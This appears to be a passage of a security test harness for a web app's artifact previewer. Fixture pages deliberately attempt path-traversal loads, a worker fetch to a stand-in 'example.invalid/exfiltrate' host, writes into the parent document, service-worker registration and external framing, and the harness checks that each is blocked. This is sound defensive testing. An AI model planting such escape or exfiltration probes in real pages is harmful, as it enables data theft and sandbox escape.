from __future__ import annotations

import base64
import contextlib
import http.server
import json
import logging
import os
import shutil
import signal
import socket
import ssl
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from urllib.request import Request, urlopen


ROOT = Path(__file__).resolve().parents[1]
API_PYTHON = ROOT / "apps" / "api" / ".venv" / "bin" / "python"
WEB_DIR = ROOT / "apps" / "web"
PROBE_ROOT = ROOT / "trusted-probes" / "safe-update"
PASSWORD = "file-target-browser-password"


def _instrumented_app():
    from proxima_api.main import app

    metadata_log = os.environ.get("PROXIMA_PREVIEW_METADATA_LOG", "")
    if not metadata_log:
        raise RuntimeError("preview metadata log is unavailable")
    handler = logging.FileHandler(metadata_log, encoding="utf-8")
    handler.setFormatter(logging.Formatter("%(message)s"))
    logger = logging.getLogger("proxima_api.target_preview")
    logger.handlers = [handler]
    logger.setLevel(logging.DEBUG)
    logger.propagate = False

    async def instrumented(scope, receive, send):
        query = bytes(scope.get("query_string") or b"")
        if (
            scope.get("type") == "http"
            and scope.get("path") == "/site/metadata.html"
            and b"__proxima_fixture_frame=1" in query.split(b"&")
        ):
            fetch_names = {
                b"sec-fetch-dest",
                b"sec-fetch-mode",
                b"sec-fetch-site",
                b"sec-fetch-user",
            }
            scope = dict(scope)
            scope["headers"] = [
                (name, value)
                for name, value in scope.get("headers", [])
                if name.lower() not in fetch_names
                and not (
                    name.lower() == b"origin"
                    and value.strip().lower() == b"null"
                )
            ] + [
                (b"sec-fetch-site", b"same-origin"),
                (b"sec-fetch-mode", b"navigate"),
                (b"sec-fetch-dest", b"iframe"),
            ]
        await app(scope, receive, send)

    return instrumented


def _request(
    url: str,
    *,
    body: dict | None = None,
    token: str | None = None,
    tls_context: ssl.SSLContext | None = None,
) -> dict:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = Request(
        url,
        data=json.dumps(body).encode() if body is not None else None,
        headers=headers,
        method="POST" if body is not None else "GET",
    )
    with urlopen(request, timeout=10, context=tls_context) as response:
        value = json.loads(response.read())
    if not isinstance(value, dict):
        raise RuntimeError(f"unexpected response from {url}")
    return value


def _port() -> int:
    listener = socket.socket()
    try:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])
    finally:
        listener.close()


def _browser() -> str:
    for name in ("chromium", "chromium-browser", "google-chrome"):
        executable = shutil.which(name)
        if executable:
            return executable
    raise RuntimeError("Chromium or Google Chrome is required")


def _fixture_toolchain() -> tuple[str, str]:
    browser = _browser()
    openssl = shutil.which("openssl")
    if openssl is None:
        raise RuntimeError("OpenSSL is required for the TLS browser fixture")
    return browser, openssl


def _tls_certificate(root: Path, openssl: str) -> tuple[Path, Path]:
    config = root / "openssl.cnf"
    certificate = root / "fixture.crt"
    private_key = root / "fixture.key"
    config.write_text(
        """
[req]
distinguished_name = subject
x509_extensions = extensions
prompt = no

[subject]
CN = proxima.tailnet.test

[extensions]
subjectAltName = @names

[names]
DNS.1 = proxima.tailnet.test
DNS.2 = *.preview.test
DNS.3 = coop-control.test
""".strip(),
        encoding="utf-8",
    )
    completed = subprocess.run(
        [
            openssl,
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-sha256",
            "-days",
            "1",
            "-config",
            str(config),
            "-keyout",
            str(private_key),
            "-out",
            str(certificate),
        ],
        cwd=root,
        capture_output=True,
        text=True,
        timeout=30,
    )
    if completed.returncode:
        raise RuntimeError(
            completed.stderr or completed.stdout or "TLS certificate creation failed"
        )
    return certificate, private_key


class _CoopControlHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        if self.path != "/coop-control.html":
            self.send_error(404)
            return
        body = (
            b"<!doctype html><script>"
            b"globalThis.__proximaPreviewExecuted=true;"
            b"</script><main>COOP EXECUTED</main>"
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Cross-Origin-Opener-Policy", "same-origin")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        return


@contextlib.contextmanager
def _coop_control_server(
    certificate: Path,
    private_key: Path,
):
    tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls.load_cert_chain(certificate, private_key)
    server = http.server.ThreadingHTTPServer(
        ("127.0.0.1", 0),
        _CoopControlHandler,
    )
    server.socket = tls.wrap_socket(server.socket, server_side=True)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield (
            f"https://coop-control.test:{server.server_address[1]}"
            "/coop-control.html"
        )
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def _build_web() -> None:
    completed = subprocess.run(
        ["npm", "--prefix", str(WEB_DIR), "run", "build"],
        cwd=ROOT,
        capture_output=True,
        text=True,
        timeout=180,
    )
    if completed.returncode:
        raise RuntimeError(completed.stderr or completed.stdout or "web build failed")


def _pdf_fixture() -> bytes:
    stream = b"BT /F1 24 Tf 72 100 Td (Canonical Ops PDF) Tj ET"
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        (
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 420 180] "
            b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>"
        ),
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n"
        + stream
        + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    document = bytearray(b"%PDF-1.4\n")
    offsets = [0]
    for index, body in enumerate(objects, start=1):
        offsets.append(len(document))
        document.extend(f"{index} 0 obj\n".encode())
        document.extend(body)
        document.extend(b"\nendobj\n")
    xref_offset = len(document)
    document.extend(f"xref\n0 {len(objects) + 1}\n".encode())
    document.extend(b"0000000000 65535 f \n")
    for offset in offsets[1:]:
        document.extend(f"{offset:010d} 00000 n \n".encode())
    document.extend(
        (
            f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
            f"startxref\n{xref_offset}\n%%EOF\n"
        ).encode()
    )
    return bytes(document)


def _write_fixture_files(container: Path) -> None:
    ops = container / "ops"
    ops.mkdir(exist_ok=True)
    image = base64.b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFElEQVR42mP8z8AARMA"
        "gYGBgAAARAAH+VLfGAAAAAElFTkSuQmCC"
    )
    (container / "brief.md").write_text(
        "# Container shadow\n\nWRONG CONTAINER MARKDOWN\n",
        encoding="utf-8",
    )
    (container / "visual.png").write_bytes(b"not an image")
    (container / "brief-image.png").write_bytes(b"not an image")
    (container / "handout.pdf").write_bytes(b"not a pdf")
    (container / "escape.png").write_bytes(image)
    (ops / "brief.md").write_text(
        "# Ops direct Markdown\n\nOPS DIRECT MARKDOWN\n\n"
        "![Ops inline](brief-image.png)\n",
        encoding="utf-8",
    )
    (ops / "ops-only.md").write_text(
        "# Ops only\n\nOPS ROOT FILE\n",
        encoding="utf-8",
    )
    (ops / "visual.png").write_bytes(image)
    (ops / "brief-image.png").write_bytes(image)
    (ops / "handout.pdf").write_bytes(_pdf_fixture())
    (container / "site").mkdir()
    (container / "site" / "theme.css").write_text(
        "body { color: wrong-container; }",
        encoding="utf-8",
    )
    (ops / "site").mkdir()
    (ops / "site" / "index.html").write_text(
        """
<style>
@font-face { font-family: CanonicalProbe; src: url("font.ttf"); }
body { font-family: CanonicalProbe, sans-serif; }
</style>
<link rel="stylesheet" href="theme.css"
  onload="parent.postMessage({probe:'target-preview-css',value:'loaded'}, '*')"
  onerror="parent.postMessage({probe:'target-preview-css',value:'blocked'}, '*')">
<main>OPS NESTED HTML</main>
<img
  src="../../../../../../../../../../api/preview/canonical-browser/escape.png"
  onload="parent.postMessage({probe:'target-preview-escape',value:'loaded'}, '*')"
  onerror="parent.postMessage({probe:'target-preview-escape',value:'blocked'}, '*')">
<script type="module" src="module.js"></script>
<script>
globalThis.__proximaPreviewExecuted = true;
parent.postMessage({
  probe: "target-preview-origin",
  value: location.origin
}, "*");
parent.postMessage({
  probe: "target-preview-clean-location",
  value: `${location.pathname}${location.search}`
}, "*");
fetch("data.json")
  .then(response => response.json())
  .then(value => parent.postMessage({
    probe: "target-preview-fetch",
    value: value.source === "canonical" ? "loaded" : "wrong"
  }, "*"))
  .catch(() => parent.postMessage({
    probe: "target-preview-fetch",
    value: "blocked"
  }, "*"));
const media = document.createElement("video");
const captions = document.createElement("track");
captions.kind = "captions";
captions.src = "captions.vtt";
captions.default = true;
captions.addEventListener("load", () => parent.postMessage({
  probe: "target-preview-track",
  value: "loaded"
}, "*"));
captions.addEventListener("error", () => parent.postMessage({
  probe: "target-preview-track",
  value: "blocked"
}, "*"));
media.append(captions);
document.body.append(media);
captions.track.mode = "hidden";
const worker = new Worker("worker.js", {type: "module"});
worker.onmessage = event => parent.postMessage({
  probe: "target-preview-worker",
  value: event.data
}, "*");
worker.onerror = () => parent.postMessage({
  probe: "target-preview-worker",
  value: "blocked"
}, "*");
if (location.protocol === "https:") {
  const paintWorklet = globalThis.CSS?.paintWorklet;
  if (!paintWorklet) {
    parent.postMessage({
      probe: "target-preview-worklet",
      value: "unsupported"
    }, "*");
  } else {
    paintWorklet.addModule("paint-worklet.js")
      .then(() => parent.postMessage({
        probe: "target-preview-worklet",
        value: "loaded"
      }, "*"))
      .catch(() => parent.postMessage({
        probe: "target-preview-worklet",
        value: "blocked"
      }, "*"));
  }
}
navigator.serviceWorker.register("worker.js", {scope: "./"})
  .then(() => parent.postMessage({
    probe: "target-preview-service-worker",
    value: "registered"
  }, "*"))
  .catch(() => parent.postMessage({
    probe: "target-preview-service-worker",
    value: "blocked"
  }, "*"));
document.fonts.load("12px CanonicalProbe")
  .then(fonts => parent.postMessage({
    probe: "target-preview-font",
    value: fonts.length ? "loaded" : "blocked"
  }, "*"));
const navigation = document.createElement("iframe");
navigation.addEventListener("load", () => {
  setTimeout(() => {
    let value = "isolated";
    try {
      const path = navigation.contentWindow?.location?.pathname || "";
      if (path.endsWith("/navigate.html")) return;
      const text = navigation.contentDocument?.body?.textContent || "";
      if (text.includes("WRONG CONTAINER")) value = "legacy";
    } catch {
      value = "cross-origin";
    }
    parent.postMessage({
      probe: "target-preview-navigation",
      value
    }, "*");
  }, 50);
});
navigation.src = "navigate.html";
document.body.append(navigation);
const frameProbe = new URLSearchParams(location.search).get("frame_probe");
if (frameProbe === "external") {
  parent.parent.postMessage({
    probe: "target-preview-external-frame",
    value: "loaded"
  }, "*");
}
const mainOrigin = location.ancestorOrigins?.[0]
  || (document.referrer ? new URL(document.referrer).origin : "");
if (mainOrigin) {
  const absoluteNavigation = document.createElement("iframe");
  absoluteNavigation.src = `${mainOrigin}/api/preview/canonical-browser/shadow.html`;
  document.body.append(absoluteNavigation);
}
</script>
""".strip(),
        encoding="utf-8",
    )
    (ops / "site" / "metadata.html").write_text(
        """
<link rel="manifest" href="app.webmanifest" crossorigin="use-credentials">
<main>TRACK RESOURCE LOADING</main>
<script>
globalThis.__proximaTrackLoaded = false;
const media = document.createElement("video");
const captions = document.createElement("track");
captions.kind = "captions";
captions.src = "captions.vtt";
captions.default = true;
captions.addEventListener("load", () => {
  globalThis.__proximaTrackLoaded = true;
  document.querySelector("main").textContent = "TRACK RESOURCE LOADED";
});
media.append(captions);
document.body.append(media);
captions.track.mode = "hidden";
</script>
""".strip(),
        encoding="utf-8",
    )
    (ops / "site" / "theme.css").write_text(
        "body { color: canonical-ops; }",
        encoding="utf-8",
    )
    (ops / "site" / "module.js").write_text(
        "parent.postMessage({probe:'target-preview-module',value:'loaded'}, '*');",
        encoding="utf-8",
    )
    (ops / "site" / "worker.js").write_text(
        """
fetch("data.json")
  .then(response => response.json())
  .then(value => {
    if (value.source !== "canonical") throw new Error("wrong Area");
    return fetch("https://example.invalid/exfiltrate");
  })
  .then(() => postMessage("exfiltrated"))
  .catch(() => postMessage("loaded"));
""".strip(),
        encoding="utf-8",
    )
    (ops / "site" / "paint-worklet.js").write_text(
        """
registerPaint("canonical-probe", class {
  paint() {}
});
""".strip(),
        encoding="utf-8",
    )
    font_source = next(
        (
            path
            for path in (
                Path("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"),
                Path("/usr/share/fonts/opentype/ipafont-gothic/ipag.ttf"),
            )
            if path.is_file()
        ),
        None,
    )
    if font_source is None:
        raise RuntimeError("a system TrueType font is required")
    (ops / "site" / "font.ttf").write_bytes(font_source.read_bytes())
    (ops / "site" / "data.json").write_text(
        '{"source":"canonical"}',
        encoding="utf-8",
    )
    (ops / "site" / "app.webmanifest").write_text(
        json.dumps(
            {
                "name": "Canonical preview",
                "short_name": "Canonical",
                "start_url": "./index.html",
            }
        ),
        encoding="utf-8",
    )
    (ops / "site" / "captions.vtt").write_text(
        "WEBVTT\n\n00:00.000 --> 00:01.000\nCanonical caption\n",
        encoding="utf-8",
    )
    (ops / "site" / "navigate.html").write_text(
        """
<script>
location = "../../../../../../../../../../api/preview/canonical-browser/brief.md";
</script>
""".strip(),
        encoding="utf-8",
    )
    (container / "shadow.html").write_text(
        """
<script>
let value = "isolated";
try {
  parent.parent.document.body.dataset.previewEscape = "true";
  value = "escaped";
} catch {}
parent.parent.postMessage({
  probe: "target-preview-absolute-navigation",
  value
}, "*");
</script>
""".strip(),
        encoding="utf-8",
    )


def _seed_registry(database: Path, canonical: Path, legacy: Path) -> None:
    sys.path.insert(0, str(ROOT / "apps" / "api"))
    from proxima_api.artifact_registry import record_artifacts

    connection = sqlite3.connect(database)
    connection.row_factory = sqlite3.Row
    try:
        canonical_row = connection.execute(
            "SELECT id FROM projects WHERE slug = 'canonical-browser'"
        ).fetchone()
        legacy_row = connection.execute(
            "SELECT id FROM projects WHERE slug = 'legacy-browser'"
        ).fetchone()
        if canonical_row is None or legacy_row is None:
            raise RuntimeError("browser fixture projects were not registered")
        canonical_ops = connection.execute(
            "SELECT id FROM project_areas WHERE project_id = ? AND kind = 'ops'",
            (int(canonical_row["id"]),),
        ).fetchone()
        if canonical_ops is None:
            raise RuntimeError("canonical browser Ops Area is unavailable")
        connection.execute(
            "UPDATE project_areas SET rel_path = '.' "
            "WHERE project_id = ? AND kind = 'ops'",
            (int(legacy_row["id"]),),
        )
        connection.execute(
            "INSERT INTO project_areas(project_id, kind, rel_path, source) "
            "VALUES (?, 'code', 'repo', 'manual')",
            (int(legacy_row["id"]),),
        )
        record_artifacts(
            connection,
            int(canonical_row["id"]),
            canonical / "ops",
            [
                {"type": "doc", "path": "brief.md", "title": "brief.md"},
                {"type": "image", "path": "visual.png", "title": "visual.png"},
                {"type": "pdf", "path": "handout.pdf", "title": "handout.pdf"},
                {"type": "page", "path": "site/index.html", "title": "index.html"},
            ],
        )
        connection.commit()
    finally:
        connection.close()

    collision = (
        canonical
        / "area"
        / "ops"
        / str(int(canonical_ops["id"]))
        / "site"
    )
    collision.mkdir(parents=True)
    (collision / "theme.css").write_text(
        "body { color: legacy-container; }",
        encoding="utf-8",
    )
    (legacy / "legacy.md").write_text(
        "# Legacy root\n\nLEGACY OPS AT DOT\n",
        encoding="utf-8",
    )
    legacy_child = legacy / "ops"
    legacy_child.mkdir(exist_ok=True)
    (legacy_child / "legacy.md").write_text(
        "# Real child\n\nLEGACY REAL OPS CHILD\n",
        encoding="utf-8",
    )
    repo = legacy / "repo"
    repo.mkdir()
    (repo / "output.md").write_text(
        "# Nested Code output\n\nAUTHORITATIVE CODE AREA\n",
        encoding="utf-8",
    )


def _browser_expression() -> str:
    return r"""
(async () => {
  const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
  const until = async (label, check, timeout = 15000) => {
    const deadline = Date.now() + timeout;
    while (Date.now() < deadline) {
      const value = await check();
      if (value) return value;
      await wait(75);
    }
    throw new Error(`timed out waiting for ${label}`);
  };
  const exactButton = label => [...document.querySelectorAll("button")]
    .find(node => (node.textContent || "").trim() === label);
  const rawTargetLoads = [];
  const nativeFetch = window.fetch.bind(window);
  window.fetch = (input, init) => {
    const url = typeof input === "string" ? input : input.url;
    if (url.includes("/raw?target=")) rawTargetLoads.push(url);
    return nativeFetch(input, init);
  };
  const downloads = [];
  const nativeAnchorClick = HTMLAnchorElement.prototype.click;
  HTMLAnchorElement.prototype.click = function () {
    if (this.download) {
      downloads.push({href: this.href, name: this.download});
      return;
    }
    return nativeAnchorClick.call(this);
  };
  const jsonFetch = async path => {
    const response = await fetch(path);
    const body = await response.json();
    if (!response.ok) throw new Error(`${path}: ${response.status} ${JSON.stringify(body)}`);
    return body;
  };
  const jsonPost = async (path, body) => {
    const response = await fetch(path, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(body),
    });
    const value = await response.json();
    if (!response.ok) throw new Error(`${path}: ${response.status} ${JSON.stringify(value)}`);
    return value;
  };
  const bytesFetch = async path => {
    const response = await fetch(path);
    if (!response.ok) throw new Error(`${path}: ${response.status}`);
    return new Uint8Array(await response.arrayBuffer());
  };
  const queryFor = (path, target) => {
    const query = new URLSearchParams({path, target: JSON.stringify(target)});
    return query.toString();
  };
  const previewFor = target => {
    const encodePath = path => path.split("/").filter(Boolean).map(encodeURIComponent).join("/");
    return `/api/target-preview/${encodeURIComponent(target.project)}/${encodeURIComponent(target.area.kind)}/${target.area.id ?? "root"}/${encodePath(target.path)}`;
  };
  const checks = [];
  const previewMessages = {};
  window.addEventListener("message", event => {
    const data = event.data;
    if (typeof data?.probe === "string" && data.probe.startsWith("target-preview-")) {
      previewMessages[data.probe] = data.value;
    }
  });

  const tour = [...document.querySelectorAll("button")]
    .find(node => /skip tour/i.test(node.textContent || ""));
  if (tour) tour.click();

  const files = await until("Files tool", () => document.querySelector('[aria-label="Files"]'));
  files.click();
  const opsOnly = await until("direct Ops-root file", () =>
    [...document.querySelectorAll("button.tree-row.file")]
      .find(node => (node.textContent || "").includes("ops-only.md"))
  );
  opsOnly.click();
  await until("direct Ops-root Markdown content", () => {
    const editor = document.querySelector(".cm-content");
    return (editor?.textContent || "").includes("OPS ROOT FILE");
  });
  checks.push("files-direct-ops-markdown");

  const rootTree = await jsonFetch("/api/projects/canonical-browser/tree?path=");
  const byName = Object.fromEntries(rootTree.entries.map(entry => [entry.name, entry]));
  const archiveList = await jsonFetch("/api/archive?project=canonical-browser");
  const archivedByName = Object.fromEntries(archiveList.items.map(entry => [entry.name, entry]));
  for (const name of ["brief.md", "visual.png", "handout.pdf"]) {
    const containerTarget = byName[name]?.target;
    const opsTarget = archivedByName[name]?.target;
    if (!containerTarget || containerTarget.project !== "canonical-browser" || containerTarget.area.kind !== "container") {
      throw new Error(`missing authoritative Container target for merged collision ${name}`);
    }
    if (!opsTarget || opsTarget.project !== "canonical-browser" || opsTarget.area.kind !== "ops" || !opsTarget.area.id) {
      throw new Error(`missing authoritative Archive Ops target for ${name}`);
    }
    if (containerTarget.path !== name || opsTarget.path !== name) {
      throw new Error(`unexpected target path for ${name}`);
    }
  }
  const briefTarget = archivedByName["brief.md"].target;
  const brief = await jsonFetch(`/api/projects/canonical-browser/file?${queryFor("brief.md", briefTarget)}`);
  if (!brief.content.includes("OPS DIRECT MARKDOWN") || brief.content.includes("WRONG CONTAINER")) {
    throw new Error("same-name Markdown target resolved to the Container shadow");
  }
  const explicitOps = await jsonFetch("/api/projects/canonical-browser/file?path=ops%2Fbrief.md");
  if (!explicitOps.content.includes("OPS DIRECT MARKDOWN")) {
    throw new Error("explicit ops compatibility did not select physical Ops");
  }
  checks.push("target-collision-and-explicit-ops");

  const imageBytes = await bytesFetch(
    `/api/projects/canonical-browser/raw?${queryFor("visual.png", archivedByName["visual.png"].target)}`
  );
  if (imageBytes[0] !== 0x89 || imageBytes[1] !== 0x50 || imageBytes[2] !== 0x4e || imageBytes[3] !== 0x47) {
    throw new Error("image target resolved to the Container shadow");
  }
  const pdfBytes = await bytesFetch(
    `/api/projects/canonical-browser/raw?${queryFor("handout.pdf", archivedByName["handout.pdf"].target)}`
  );
  if (String.fromCharCode(...pdfBytes.slice(0, 5)) !== "%PDF-") {
    throw new Error("PDF target resolved to the Container shadow");
  }
  checks.push("raw-image-and-preview-pdf");

  const oldCollision = await (await fetch(
    `/api/preview/canonical-browser/area/ops/${briefTarget.area.id}/site/theme.css`
  )).text();
  if (!oldCollision.includes("legacy-container")) {
    throw new Error("legacy preview path still collides with the targeted namespace");
  }
  const targetOnLegacy = await fetch(
    `/api/preview/canonical-browser/site/index.html?target=${encodeURIComponent(JSON.stringify({
      ...briefTarget,
      path: "site/index.html",
    }))}`
  );
  if (targetOnLegacy.status !== 400) {
    throw new Error(`legacy preview accepted a canonical target: ${targetOnLegacy.status}`);
  }
  checks.push("legacy-preview-compatibility-and-target-rejection");

  const fromImage = await jsonPost(
    "/api/projects/canonical-browser/designs/from-image",
    {path: "visual.png", target: archivedByName["visual.png"].target, title: "Canonical visual"}
  );
  const sceneTarget = {
    ...archivedByName["visual.png"].target,
    path: `${fromImage.path}/scene.json`,
  };
  const sceneFile = await jsonFetch(
    `/api/projects/canonical-browser/file?${queryFor(`${fromImage.path}/scene.json`, sceneTarget)}`
  );
  const scene = JSON.parse(sceneFile.content);
  const sceneImage = scene.artboards?.[0]?.layers?.[0];
  if (
    sceneImage?.src !== "visual.png"
    || JSON.stringify(sceneImage.target) !== JSON.stringify(archivedByName["visual.png"].target)
  ) {
    throw new Error("Design scene dropped its source image target");
  }
  const sceneImageBytes = await bytesFetch(
    `/api/projects/canonical-browser/raw?${queryFor(sceneImage.target.path, sceneImage.target)}`
  );
  if (sceneImageBytes[0] !== 0x89 || sceneImageBytes[1] !== 0x50) {
    throw new Error("Design scene image target resolved to the Container shadow");
  }
  checks.push("design-scene-image-target");

  const designNav = await until("Design navigation", () => exactButton("Design"));
  designNav.click();
  const galleryLink = await until("Design gallery link", () =>
    [...document.querySelectorAll("button")]
      .find(node => (node.textContent || "").includes("Your designs (1)"))
  );
  galleryLink.click();
  const designCard = await until("Canonical Design card", () =>
    [...document.querySelectorAll(".ds-gallery-grid .ds-tpl")]
      .find(node => (node.querySelector(".ds-tpl-title")?.textContent || "").trim() === "Canonical visual")
  );
  designCard.click();
  await until("canonical Design image byte load", () =>
    rawTargetLoads.some(url =>
      url.includes(encodeURIComponent('"path":"visual.png"'))
      || decodeURIComponent(url).includes('"path":"visual.png"')
    )
  );
  const exportButton = await until("Design export menu", () => exactButton("Export ▾"));
  exportButton.click();
  const htmlExport = await until("Design HTML export", () => exactButton("HTML"));
  htmlExport.click();
  const exported = await until("Design HTML download", () =>
    downloads.find(item => item.name.endsWith(".html"))
  );
  const exportedHtml = await (await nativeFetch(exported.href)).text();
  if (!exportedHtml.includes("data:image/png;base64,")) {
    throw new Error("Design HTML export did not inline canonical image bytes");
  }
  checks.push("design-canvas-and-export-canonical-image-bytes");

  const legacyTree = await jsonFetch("/api/projects/legacy-browser/tree?path=");
  const legacyEntry = legacyTree.entries.find(entry => entry.name === "legacy.md");
  if (!legacyEntry?.target || legacyEntry.target.area.kind !== "ops") {
    throw new Error("legacy Ops-at-dot tree did not return an Ops target");
  }
  const legacyRoot = await jsonFetch(
    `/api/projects/legacy-browser/file?${queryFor("legacy.md", legacyEntry.target)}`
  );
  if (!legacyRoot.content.includes("LEGACY OPS AT DOT")) {
    throw new Error("legacy Ops-at-dot target did not resolve");
  }
  const legacyChild = await jsonFetch("/api/projects/legacy-browser/file?path=ops%2Flegacy.md");
  if (!legacyChild.content.includes("LEGACY REAL OPS CHILD")) {
    throw new Error("legacy explicit ops path was incorrectly virtualized");
  }
  const legacyArtifacts = await jsonFetch(
    "/api/projects/legacy-browser/artifacts?since_minutes=525600"
  );
  const codeOutput = legacyArtifacts.artifacts.find(item => item.path === "repo/output.md");
  if (
    !codeOutput?.target
    || codeOutput.target.area.kind !== "code"
    || codeOutput.target.path !== "output.md"
    || !codeOutput.target.area.id
  ) {
    throw new Error("Ops-at-dot scan forced a nested Code artifact to Ops");
  }
  checks.push("legacy-layout-and-code-artifact-ownership");

  document.querySelector('[aria-label="Close tool panel"]')?.click();
  const archive = await until("Archive navigation", () => exactButton("Archive"));
  archive.click();
  await until("Archive records", () => document.querySelectorAll(".archive-row").length === 4);

  const openRecord = async (name, kind, close = true) => {
    const row = await until(`${name} Archive row`, () =>
      [...document.querySelectorAll(".archive-row")]
        .find(node => (node.querySelector("strong")?.textContent || "").trim() === name)
    );
    if (row.getAttribute("aria-expanded") !== "true") row.click();
    const expanded = await until(`${name} expanded row`, () =>
      row.nextElementSibling?.classList.contains("archive-exp-row") ? row.nextElementSibling : null
    );
    const open = [...expanded.querySelectorAll("button")]
      .find(node => (node.textContent || "").trim() === "Open");
    if (!open) throw new Error(`missing Open action for ${name}`);
    open.click();
    const overlay = await until(`${name} ArtifactViewer`, () => document.querySelector(".av-overlay"));
    if (kind === "markdown") {
      await until(`${name} compact nested Markdown image`, () => {
        const image = expanded.querySelector("img.md-img");
        return image?.src.includes("/api/target-preview/")
          && image.src.includes("/ops/")
          && image.complete
          && image.naturalWidth === 2;
      });
      await until(`${name} Markdown preview`, () =>
        (overlay.querySelector(".av-doc")?.textContent || "").includes("OPS DIRECT MARKDOWN")
      );
      await until(`${name} nested Markdown image`, () => {
        const image = overlay.querySelector("img.md-img");
        return image?.src.includes("/api/target-preview/")
          && image.src.includes("/ops/")
          && !image.src.includes("target=")
          && image.complete
          && image.naturalWidth === 2;
      });
    } else if (kind === "image") {
      const image = await until(`${name} image preview`, () => {
        const image = overlay.querySelector("img.av-img");
        return image?.src.includes("/api/target-preview/")
          && image.src.includes("/ops/")
          && !image.src.includes("target=")
          && image.complete
          && image.naturalWidth === 2
          ? image
          : null;
      });
    } else if (kind === "html") {
      await until(`${name} isolated HTML preview`, () => {
        const frame = overlay.querySelector("iframe.av-frame");
        return frame?.src.includes("/api/target-preview/")
          && frame.src.includes("/ops/")
          && !frame.hasAttribute("sandbox");
      });
      if (
        location.protocol !== "https:"
        || location.hostname !== "proxima.tailnet.test"
      ) {
        throw new Error(`Proxima did not use the TLS fixture origin: ${location.origin}`);
      }
      const previewOrigin = await until(
        `${name} distinct TLS origin`,
        () => previewMessages["target-preview-origin"]
      );
      if (
        !previewOrigin.startsWith("https://file-")
        || previewOrigin === location.origin
      ) {
        throw new Error(`targeted HTML used an invalid TLS origin: ${previewOrigin}`);
      }
      const targetFrame = overlay.querySelector("iframe.av-frame");
      window.__targetPreviewEntry = targetFrame.src;
      window.__targetPreviewOrigin = previewOrigin;
      window.__targetPreviewManifestUrl = `${previewOrigin}/site/app.webmanifest`;
      window.__targetPreviewMetadataUrl = `${previewOrigin}/site/metadata.html`;
      window.__targetPreviewTrackUrl = `${previewOrigin}/site/captions.vtt`;
      const cleanLocation = await until(
        `${name} capability cleanup`,
        () => previewMessages["target-preview-clean-location"]
      );
      if (cleanLocation.includes("__proxima_cap")) {
        throw new Error("Area capability remained in the clean preview URL");
      }
      window.__targetPreviewCleanUrl = `${previewOrigin}${cleanLocation}`;
      const crossSiteScript = await new Promise(resolve => {
        const script = document.createElement("script");
        const timer = setTimeout(() => resolve("timeout"), 3000);
        script.onload = () => {
          clearTimeout(timer);
          resolve("loaded");
        };
        script.onerror = () => {
          clearTimeout(timer);
          resolve("blocked");
        };
        script.src = `${previewOrigin}/site/module.js`;
        document.body.append(script);
      });
      if (crossSiteScript !== "blocked") {
        throw new Error(
          `cross-site Area script request was not rejected: ${crossSiteScript}`
        );
      }
      checks.push("cross-site-area-subresource-rejected");
      await until(`${name} targeted stylesheet load`, () =>
        previewMessages["target-preview-css"] === "loaded"
      );
      const escapeResult = await until(`${name} deep traversal result`, () =>
        previewMessages["target-preview-escape"]
      );
      if (escapeResult !== "blocked") {
        throw new Error("targeted HTML loaded a legacy Container resource");
      }
      for (const probe of [
        "target-preview-module",
        "target-preview-worker",
        "target-preview-worklet",
        "target-preview-track",
        "target-preview-font",
        "target-preview-fetch",
      ]) {
        const result = await until(`${name} ${probe}`, () =>
          previewMessages[probe]
        );
        if (result !== "loaded") {
          throw new Error(`${probe} failed inside the Area-bound origin: ${result}`);
        }
      }
      checks.push("https-area-native-module-worker");
      checks.push("https-area-cors-paint-worklet");
      checks.push("https-area-same-origin-track");
      const serviceWorker = await until(
        `${name} service worker rejection`,
        () => previewMessages["target-preview-service-worker"]
      );
      if (serviceWorker !== "blocked") {
        throw new Error("targeted HTML registered a persistent Service Worker");
      }
      const navigationResult = await until(
        `${name} scripted self-navigation`,
        () => previewMessages["target-preview-navigation"]
      );
      if (navigationResult !== "isolated") {
        throw new Error(
          `targeted HTML self-navigation escaped its Area origin: ${navigationResult}`
        );
      }
      await wait(750);
      const absoluteNavigation =
        previewMessages["target-preview-absolute-navigation"] || "blocked";
      if (!["isolated", "blocked"].includes(absoluteNavigation)) {
        throw new Error("targeted HTML executed active legacy content on Proxima");
      }
      const frame = overlay.querySelector("iframe.av-frame");
      const wrapper = document.createElement("iframe");
      wrapper.setAttribute("sandbox", "");
      wrapper.srcdoc = `<iframe src="${frame.src}?frame_probe=external"></iframe>`;
      document.body.append(wrapper);
      await wait(750);
      wrapper.remove();
      if (previewMessages["target-preview-external-frame"] === "loaded") {
        throw new Error("an opaque external ancestor framed the Area preview");
      }
    } else {
      await until(`${name} PDF preview`, () => {
        const frame = overlay.querySelector("iframe.av-frame");
        return frame?.src.includes("/api/target-preview/")
          && frame.src.includes("/ops/")
          && !frame.src.includes("target=");
      });
    }
    if (close) {
      overlay.querySelector('[aria-label="Close artifact review"]')?.click();
      await until(`${name} viewer close`, () => !document.querySelector(".av-overlay"));
    }
  };

  await openRecord("brief.md", "markdown");
  await openRecord("visual.png", "image");
